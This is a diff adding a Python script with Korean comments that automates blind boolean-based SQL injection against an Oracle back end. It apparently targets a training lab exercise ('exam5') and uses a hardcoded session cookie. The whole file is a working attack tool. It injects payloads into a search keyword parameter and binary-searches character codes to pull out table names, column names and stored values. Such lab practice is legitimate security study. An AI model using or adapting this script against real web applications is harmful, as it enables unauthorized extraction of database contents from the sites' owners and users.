@@ -1,0 +1,172 @@
+=======================================
+
+* SQL Injection Oracle 5번 자동화 공격
+
+=======================================
+
+- 이진탐색 적용
+
+- 테이블명 탈취(ANSWER)
+
+- 컬럼 탈취
+
+- 정답 탈취
+
+import requests
+
+base_url = "https://lab.eqst.co.kr:8442/exam5/free"
+
+headers = {
+    "Cookie": "JSESSIONID=F0A0FAD924E209A061EF9FF55C6DA914"
+}
+
+params_template = {
+    "page": "1",
+    "sorting": "",
+    "sortingAd": "",
+    "startDt": "",
+    "endDt": "",
+    "searchType": "all",
+    "keyword": ""  
+}
+
+def check_condition(injected_sql):
+    params = params_template.copy()
+    params["keyword"] = injected_sql
+    try:
+        r = requests.get(base_url, params=params, headers=headers)
+        r.raise_for_status()
+        return '<tr class="notice">' in r.text
+    except requests.exceptions.RequestException as e:
+        print(f"Request failed: {e}")
+        return False
+
+def get_table_count(max_count=100):
+    print("테이블 개수 추출을 시작합니다...")
+    low, high = 0, max_count
+    count = 0
+    while low <= high:
+        mid = (low + high) // 2
+        if mid == 0:
+            low = mid + 1
+            continue
+        params = f"usagi cute%' AND (SELECT COUNT(*) FROM user_tables)>{mid-1} AND 'j%'='j"
+        if check_condition(params):
+            count = mid
+            low = mid + 1
+        else:
+            high = mid - 1
+    return count
+
+def extract_table_name(table_idx, max_len=30):
+    result = ""
+    for pos in range(1, max_len + 1):
+        low, high = 32, 126
+        while low <= high:
+            mid = (low + high) // 2
+            params = f"usagi cute%' AND ASCII(SUBSTR((SELECT table_name FROM (SELECT table_name, ROWNUM r FROM (SELECT table_name FROM user_tables ORDER BY table_name)) WHERE r={table_idx}),{pos},1))>{mid} AND 'j%'='j"
+            if check_condition(params):
+                low = mid + 1
+            else:
+                high = mid - 1
+        
+        if 32 <= low <= 126:
+            result += chr(low)
+        else:
+            break
+    return result
+
+def get_column_count(table, max_count=50):
+    print(f"'{table}' 테이블의 컬럼 개수 추출을 시작합니다...")
+    low, high = 0, max_count
+    count = 0
+    while low <= high:
+        mid = (low + high) // 2
+        if mid == 0:
+            low = mid + 1
+            continue
+        params = f"usagi cute%' AND (SELECT COUNT(*) FROM user_tab_columns WHERE table_name=UPPER('{table}'))>{mid-1} AND 'j%'='j"
+        if check_condition(params):
+            count = mid
+            low = mid + 1
+        else:
+            high = mid - 1
+    return count
+
+def extract_column_name(table, col_idx, max_len=30):
+    result = ""
+    for pos in range(1, max_len + 1):
+        low, high = 32, 126
+        while low <= high:
+            mid = (low + high) // 2
+            params = f"usagi cute%' AND ASCII(SUBSTR((SELECT column_name FROM (SELECT column_name, ROWNUM r FROM (SELECT column_name FROM user_tab_columns WHERE table_name=UPPER('{table}') ORDER BY column_id)) WHERE r={col_idx}),{pos},1))>{mid} AND 'j%'='j"
+            if check_condition(params):
+                low = mid + 1
+            else:
+                high = mid - 1
+        
+        if 32 <= low <= 126:
+            result += chr(low)
+        else:
+            break
+    return result
+
+def extract_column_value(table, column, rownum=1, max_len=50):
+    result = ""
+    for pos in range(1, max_len + 1):
+        low, high = 32, 126
+        while low <= high:
+            mid = (low + high) // 2
+            params = f"usagi cute%' AND ASCII(SUBSTR((SELECT {column} FROM (SELECT {column}, ROWNUM r FROM {table} ORDER BY ROWNUM) WHERE r={rownum}),{pos},1))>{mid} AND 'j%'='j"
+            if check_condition(params):
+                low = mid + 1
+            else:
+                high = mid - 1
+
+        if 32 <= low <= 126:
+            result += chr(low)
+        else:
+            break
+    return result
+
+if __name__ == "__main__":
+    table_count = get_table_count()
+    if table_count == 0:
+        print("테이블을 찾지 못했습니다.")
+        exit()
+    print(f"총 테이블 개수: {table_count}\n")
+    
+    print("전체 테이블명 추출을 시작합니다...")
+    table_names = []
+    for i in range(1, table_count + 1):
+        tbl_name = extract_table_name(i)
+        table_names.append(tbl_name)
+        print(f"{i}번째 테이블명: {tbl_name}")
+    
+    target_table = input("\n분석할 테이블명을 입력하세요: ").strip().upper()
+    if target_table not in table_names:
+        print(f"에러: '{target_table}' 테이블을 찾을 수 없습니다.")
+        exit()
+
+    col_count = get_column_count(target_table)
+    if col_count == 0:
+        print(f"'{target_table}' 테이블에서 컬럼을 찾지 못했습니다.")
+        exit()
+    
+    print(f"'{target_table}' 테이블의 컬럼 개수: {col_count}\n")
+    
+    print(f"'{target_table}' 테이블의 컬럼명을 추출합니다...")
+    column_names = []
+    for i in range(1, col_count + 1):
+        col_name = extract_column_name(target_table, i)
+        column_names.append(col_name)
+        print(f"{i}번째 컬럼명: {col_name}")
+
+    print("\n위 컬럼 리스트 중 하나를 선택하여 데이터를 추출합니다.")
+    target_col = input("추출할 컬럼명을 입력하세요: ").strip().upper()
+    
+    if target_col in column_names:
+        value = extract_column_value(target_table, target_col, rownum=1)
+        print(f"\n결과: '{target_col}' 컬럼의 첫 번째 데이터는 '{value}' 입니다.")
+    else:
+        print(f"\n에러: '{target_col}'은(는) 유효한 컬럼명이 아닙니다.")
